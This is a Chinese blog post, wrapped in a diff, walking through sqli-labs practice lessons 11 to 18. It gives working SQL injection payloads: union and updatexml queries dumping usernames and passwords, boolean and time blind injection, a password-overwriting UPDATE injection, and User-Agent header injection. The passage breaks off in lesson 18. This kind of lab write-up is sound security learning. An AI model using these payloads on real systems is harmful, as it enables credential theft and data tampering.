@@ -1,0 +1,742 @@
+<!DOCTYPE html>
+<html lang="zh-hans">
+
+<head>
+    
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+<meta name="HandheldFriendly" content="True" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/apple-touch-icon.png" />
+<link rel="icon" type="image/png" sizes="32x32" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/favicon-32x32.png" />
+<link rel="icon" type="image/png" sizes="16x16" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/favicon-16x16.png" />
+<link rel="manifest" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/site.webmanifest" />
+<link rel="mask-icon" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/safari-pinned-tab.svg" color="#8aa2d3" />
+<link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/favicon.ico" />
+<meta name="theme-color" content="#ffffff" />
+
+
+<title>Sqli-labs-less 11-22 - Phoenix-Pl’s Blog</title>
+
+
+<meta name="author" content="DSRKafuU" />
+
+
+<meta name="description" content="A minimal Hugo theme with nice theme color." />
+
+
+<meta name="keywords" content="Sqli-labs" />
+
+
+<meta property="og:title" content="Sqli-labs-less 11-22" />
+<meta name="twitter:title" content="Sqli-labs-less 11-22" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://Phoenix-Pl.github.io/post/sqli-labs-less11-22/" /><meta property="og:description" content="less-11 这关开始换了种方式 ==POST== ，前面的都是==GET== 基础知识 GET和POST的区别 最直观的区别就是GET把参数包含在URL中，POST通过request body传递参数。 GET和POST还有一个重大区别 简" />
+<meta name="twitter:description" content="less-11 这关开始换了种方式 ==POST== ，前面的都是==GET== 基础知识 GET和POST的区别 最直观的区别就是GET把参数包含在URL中，POST通过request body传递参数。 GET和POST还有一个重大区别 简" /><meta property="og:image" content="https://Phoenix-Pl.github.io/img/og.png" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://Phoenix-Pl.github.io/img/og.png" /><meta property="article:published_time" content="2020-05-11T00:00:00+00:00" /><meta property="article:modified_time" content="2020-05-11T00:00:00+00:00" />
+
+
+<style>
+    @media (prefers-color-scheme: dark) {
+        body[data-theme='auto'] img {
+            filter: brightness(60%);
+        }
+    }
+
+    body[data-theme='dark'] img {
+        filter: brightness(60%);
+    }
+</style>
+
+
+
+<link rel="stylesheet" href="https://Phoenix-Pl.github.io/assets/css/fuji.min.css" />
+
+
+
+
+
+</head>
+
+<body data-theme="auto">
+    <script data-cfasync="false">
+  
+  var fujiThemeData = localStorage.getItem('fuji_data-theme');
+  
+  if (!fujiThemeData) {
+    localStorage.setItem('fuji_data-theme', 'auto');
+  } else {
+    
+    if (fujiThemeData !== 'auto') {
+      document.body.setAttribute('data-theme', fujiThemeData === 'dark' ? 'dark' : 'light');
+    }
+  }
+</script>
+    <header>
+    <div class="container-lg clearfix">
+        <div class="col-12 header">
+            <a class="title-main" href="https://Phoenix-Pl.github.io/">Phoenix-Pl’s Blog</a>
+            
+            <span class="title-sub">书山有路勤为径，学海无涯苦作舟</span>
+            
+        </div>
+    </div>
+</header>
+
+    <main>
+        <div class="container-lg clearfix">
+            
+            <div class="col-12 col-md-9 float-left content">
+                
+<article>
+    
+    <h2 class="post-item post-title">
+        <a href="https://Phoenix-Pl.github.io/post/sqli-labs-less11-22/">Sqli-labs-less 11-22</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2020-05-11</span><span><i class="iconfont icon-file-tray-sharp"></i>&nbsp;4534 字</span><span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/sqli-labs">Sqli-labs</a>&nbsp;</span>
+
+    </div>
+    
+    <div class="post-content markdown-body">
+        <h3 id="less-11">less-11</h3>
+<p>这关开始换了种方式 ==POST== ，前面的都是==GET==</p>
+<p><strong>基础知识</strong></p>
+<p><code>GET</code>和<code>POST</code>的区别</p>
+<p>最直观的区别就是GET把参数包含在URL中，POST通过request body传递参数。</p>
+<p>GET和POST还有一个重大区别</p>
+<p>简单的说：</p>
+<p>GET产生一个TCP数据包；POST产生两个TCP数据包。</p>
+<p>长的说：</p>
+<p>对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；</p>
+<p>而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。</p>
+<p>也就是说，GET只需要汽车跑一趟就把货送到了，而POST得跑两趟，第一趟，先去和服务器打个招呼“嗨，我等下要送一批货来，你们打开门迎接我”，然后再回头把货送过去。</p>
+<p>因为POST需要两步，时间上消耗的要多一点，看起来GET比POST更有效。因此Yahoo团队有推荐用GET替换POST来优化网站性能。但这是一个坑！跳入需谨慎。为什么？</p>
+<ol>
+<li>
+<p>GET与POST都有自己的语义，不能随便混用。</p>
+</li>
+<li>
+<p>据研究，在网络环境好的情况下，发一次包的时间和发两次包的时间差别基本可以无视。而在网络环境差的情况下，两次包的TCP在验证数据包完整性上，有非常大的优点。</p>
+</li>
+<li>
+<p>并不是所有浏览器都会在POST中发送两次包，Firefox就只发送一次。</p>
+</li>
+</ol>
+<p>这里转载自这位师傅： <a href="https://www.cnblogs.com/logsharing/p/8448446.html" target="_blank">链接</a></p>
+<hr>
+<p><strong>这里回到题目</strong></p>
+<p>一个新的界面</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201028231211155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li>先用 <code>admin</code> 登录一下</li>
+</ul>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201028231439206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li>这里用 <code>burp</code> 抓包，抓点击 <code>Submit</code> 后的包</li>
+</ul>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201028232212629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li>这里使用 <code>hackerbar</code> 在 <code>Post data</code> 中填入，如图</li>
+</ul>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201029192843513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li>在 <code>uname=admin</code> 后面加 <code>'</code> 后报错，说明存在==SQL注入==</li>
+</ul>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201029194153686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li>用 <code>#</code> 注释掉，发现正常</li>
+</ul>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201029194330706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li>用不同账号有不同回显，说明能够联合查询</li>
+</ul>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201029194638349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201029194705278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li>当order by 2时页面返回正常，说明字段是2.</li>
+</ul>
+<p><code>uname=admin' order by 2 #&amp;passwd=admin&amp;submit=Submit</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201029195041846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>查回显</strong></p>
+<p><code>uname=-admin' union select 1,2 #&amp;passwd=admin&amp;submit=Submit</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201029195257708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>payload: <code>uname=-admin' union select 2,group_concat(0x7e,username,password) from users #&amp;passwd=admin&amp;submit=Submit</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201029195605227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>在用户名中输入单引号报错</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201029194153686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><code>You have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near 'admin' LIMIT 0,1' at line 1</code></p>
+<p><code>'admin'' and password='' LIMIT 0,1</code>说明可以报错注入，且看出时字符型注入，参数包裹中有单引号。</p>
+<p>在用户名处输入<code>admin '#</code>成功登录，说明闭合方式只有单引号。</p>
+<p>payload:<code>uname=-admin' and updatexml(1,concat(0x5e,(select group_concat(username,0x7e,password) from users),0x5e),1) #&amp;passwd=admin&amp;submit=Submit</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201029200300761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>这里发现报错不全，这是因为 <code>updatexml</code> 有一个最大显示长度，这里可以使用</p>
+<p><code>substr</code> 函数截取显示数据</p>
+<p>payload：<code>uname=admin' and updatexml(1,concat(0x5e,(substr((select group_concat(username,0x7e,password) from users),1)),0x5e),1) #&amp;passwd=admin&amp;submit=Submit</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201029200906444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020102920094036.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>这里发现向后推了一位，后面内容继续后推即可显示</p>
+<h3 id="less-12">less-12</h3>
+<p>测试单引号不报错，测试双引号报错</p>
+<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&quot;admin&quot;&quot;) and password=(&quot; &quot;) LIMIT 0,1’ at line 1</code></p>
+<p>从<code>&quot;admin&quot;&quot;) and password=(&quot;&quot;) LIMIT 0,1</code>可以看出字符型注入，闭合方式为<code>&quot;)</code></p>
+<p>其余步骤与11关操作类似</p>
+<h3 id="less-13">less-13</h3>
+<p>当 <code>uname</code> 和 <code>passwd</code> 正确的时候只显示成功</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201029202744423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>测试单引号发现报错，根据</p>
+<p><code> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘‘admin’’) and password=(‘’) LIMIT 0,1’ at line 1</code></p>
+<p>从<code>'admin'') and password=('') LIMIT 0,1</code>看出字符型注入闭合方式为<code>')</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201029203038968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>所以此关采取盲注（布尔、时间、报错）</p>
+<p>这里就各举一个例子，后面同理</p>
+<p><strong>报错盲注</strong></p>
+<p><strong>payload：</strong><code>uname=admin') and updatexml(1,concat(0x5e,(substr((select group_concat(username,0x7e,password) from users),1)),0x5e),1) #&amp;passwd=admin&amp;submit=Submit</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201029223438551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>布尔盲注</strong></p>
+<p><strong>payload：</strong><code>uname=admin')and left(database(),1)&gt;'a'#&amp;passwd=任意密码&amp;submit=Submit</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020102922522046.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>时间盲注</strong></p>
+<p><strong>payload：</strong><code>uname=admin')and If(ascii(substr(database(),1,1))&gt;1,1,sleep(6))#&amp;passwd=任意密码&amp;submit=Submit</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201029225532409.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="less-14">less-14</h3>
+<p>测试单引号没报错，双引号报错</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201029230003474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><code>You have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near 'admin&quot; LIMIT 0,1' at line 1</code></p>
+<p>中由<code>admin&quot; LIMIT 0,1</code>得出闭合方式为 <code>&quot;</code></p>
+<p>其余的同13关</p>
+<h3 id="less-15">less-15</h3>
+<p>测试单引号、双引号、括号之类的都没有报错。但当输入<code>admin'#</code>，成功登录，说明闭合方式为单引号，并且<strong>取消了报错</strong>，所以这关不能使用报错注入，只能使用<strong>布尔和时间盲注</strong></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201029230657372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>步骤同上</p>
+<h3 id="less-16">less-16</h3>
+<p>与15关相同关闭了报错提示，但可以根据页面的回显来判断。</p>
+<p>当测试到<code>admin&quot;) #</code>时页面显示登陆成功，所以闭合方式为双引号括号<code>&quot;)</code>，如果不知道用户名可以这样测试， <code>123&quot;) or 1 #</code></p>
+<p>本关依旧是可以进行布尔盲注和时间盲注。</p>
+<h3 id="less-17">less-17</h3>
+<p>此关是一个修改密码的情形</p>
+<p>为了方便我们查看，我们在源码中加入几行代码</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030082322875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030082352528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>看一下源码</p>
+<pre><code class="language-php">$uname=check_input($_POST['uname']);  
+
+$passwd=$_POST['passwd'];
+</code></pre>
+<p>我们可以看到用户名被特殊处理了。</p>
+<pre><code class="language-php">function check_input($value)
+	{
+	if(!empty($value))
+		{
+		// truncation (see comments)
+		$value = substr($value,0,15);
+		}
+
+		// Stripslashes if magic quotes enabled
+		if (get_magic_quotes_gpc())
+			{
+			$value = stripslashes($value);
+			}
+
+		// Quote if not a number
+		if (!ctype_digit($value))
+			{
+			$value = &quot;'&quot; . mysql_real_escape_string($value) . &quot;'&quot;;
+			}
+		
+	else
+		{
+		$value = intval($value);
+		}
+	return $value;
+	}
+</code></pre>
+<p>传入函数的值首先被截断取前15个字符。</p>
+<ul>
+<li><code>get_magic_quotes_gpc</code> — 获取当前 magic_quotes_gpc 的配置选项设置</li>
+</ul>
+<p>如果 magic_quotes_gpc 为关闭时返回 0，否则返回 1。在 PHP 5.4.0 起将始终返回 FALSE。<code>magic_quotes_gpc</code>开启时用于在预定义字符（单引号、双引号、斜杠、NULL）前加上反斜杠，</p>
+<p>5.4.0 始终返回 FALSE，因为这个魔术引号功能已经从 PHP 中移除了。</p>
+<ul>
+<li><code>addslashes()</code> 函数返回在预定义字符(单引号、双引号、斜杠、NULL)之前添加反斜杠的字符串。</li>
+</ul>
+<p>注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</p>
+<ul>
+<li><code>stripslashes()</code> 函数删除由 addslashes() 函数添加的反斜杠。</li>
+</ul>
+<p>提示：该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。</p>
+<ul>
+<li><code>ctype_digit()</code> — 做纯数字检测</li>
+</ul>
+<p>ctype_digit：检测字符串中的字符是否都是数字，负数和小数会检测不通过</p>
+<p>注意这里是字符串，所以如果检验的是数字，也不会通过.</p>
+<ul>
+<li><code>mysql_real_escape_string()</code> 函数转义 SQL 语句中使用的字符串中的特殊字符。<code>\x00</code> <code>\n</code> <code>\r</code> <code>\</code> <code>'</code> <code>&quot;</code> <code>\x1a</code></li>
+</ul>
+<p>从<code>check_input()</code>看出被接收的用户名最终结果为，要么是数字，要么是特殊字符被转义后的字符串。</p>
+<p>所以这里不好下手，只能从密码下手。</p>
+<pre><code class="language-php">// connectivity 
+@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;
+
+$result=mysql_query($sql);
+$row = mysql_fetch_array($result);
+//echo $row;
+	if($row)
+	{
+</code></pre>
+<p>可以看出，<strong>用户名必须是数据库有的用户</strong></p>
+<p>这里先试一下，给 <code>uname</code> 加个单引号</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030115525123.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>果然被转义了，和之前分析的源码一致</p>
+<p>然后再尝试 <code>passwd</code> 发现报错</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020103008272132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>由 <code>You have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near 'admin'' at  line 1</code></p>
+<p>中 <code>admin'</code> 可知闭合方式为 <code>'</code></p>
+<p>如果后边加上注释，语句就变成了这样<code>UPDATE users SET password = 'admin' #' WHERE username='admin'</code>。密码都改成admin了,因为#注释了后边的限制。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030083123582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030084109401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>在密码处测试了一下<code>111' and 1=1 #</code>,也就是语句为<code>uname=admin&amp;passwd=admin' and 1=1#</code>结果密码都变成1了。为啥不变成111呢？实际这里执行了<code>UPDATE users SET password = '111'or 1=1;</code>password=后面优先运算or，所以返回的结果是真，也就是1，所以说**<code>sql</code>语句是优先运算and和or的**</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020103008403919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>这里发现所有密码都被改了，你可能有点慌，想改回去其实很简单只需要重新安装一下就可以了，再简单点就点一下<code>sqli-labs</code>首页的<code>set up就行了</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030084427858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>这样就改回来了</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030084643305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>因为该语句没有返回的查询结果，所以我们尝试进行盲注</p>
+<p>尝试<code>uname=admin&amp;passwd=111' and updatexml(1,concat(0x5e,(select group_concat(username,password) from users),0x5e),1)#</code> 报错</p>
+<pre><code class="language-sql">You can't specify target table 'users' for update in FROM clause
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030085824376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>原因：不能不能先select出同一表中的某些值，再update这个表(在同一语句中)，</p>
+<p>==仅在mysql数据库中==</p>
+<p>我们再加一层select，还要给里面那层给个别名。 <code>uname=admin&amp;passwd=111' and updatexml(1,concat(0x5e,(select group_concat(username,password) from (select * from users)shell),0x5e),1)</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030090302914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>利用substr<code>uname=admin&amp;passwd=111' and updatexml(1,concat(0x5e,substr((select group_concat(username,0x7e,password) from (select * from users)hack),1,31),0x5e),1)#</code>,说一说为啥不用left()，right(),因为查询的结果内容太多，导致中间的部分内容用<code>left</code>和<code>right</code>函数弄不出来。而<code>substr()</code>可以灵活的定位截取。</p>
+<p>测试<code>111' and sleep(1) #</code>,发现可以进行时间盲注.步骤和前面关卡一致</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030090834795.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>在mysql，时间等于sleep的时间乘以被改变的数量(14个数据)</p>
+<h3 id="less-18">less-18</h3>
+<p>尝试弱密码爆破，admin和admin登陆成功。并且成功后新增返回UA信息。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030091907578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>这里看一下源码</p>
+<pre><code class="language-sql">$uname = check_input($_POST['uname']);
+$passwd = check_input($_POST['passwd']);
+</code></pre>
+<p>用户名密码出都做了过滤，</p>
+<pre><code class="language-sql">$uagent = $_SERVER['HTTP_USER_AGENT'];
+$IP = $_SERVER['REMOTE_ADDR'];
+</code></pre>
+<p>这里使用了使用了 REMOTE_ADDR方法获取ip,这个函数是不能伪造的，像HTTP_X_FORWARDED_FOR这个可以获取到伪造的ip,所以尝试进行对UA注入。</p>
+<p><a href="http://blog.nsfocus.net/user-ip/" target="_blank">详情链接</a></p>
+<p>这里为了方便我们理解，同样增加一些代码</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030093654734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>后面会使用到一些插件，当然也可以用<code>burp</code></p>
+<p>首先是<code>ModHeader</code>,用于编写头部信息，在此关中可以用于编写<code>UA</code></p>
+<p>在这里输入一个单引号，发现报错</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030095117748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>根据报错结果我们可以推断出，执行的sql语句可能大致为为： <code>insert into 表名 values('UA','IP','用户名');</code></p>
+<p>UA处变为<code>1',1,1) #</code>就不报错了，更加验证了此处的sql语句。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030095359588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201030100014936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzkxNTQy,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>当然也可以这样闭合</p>
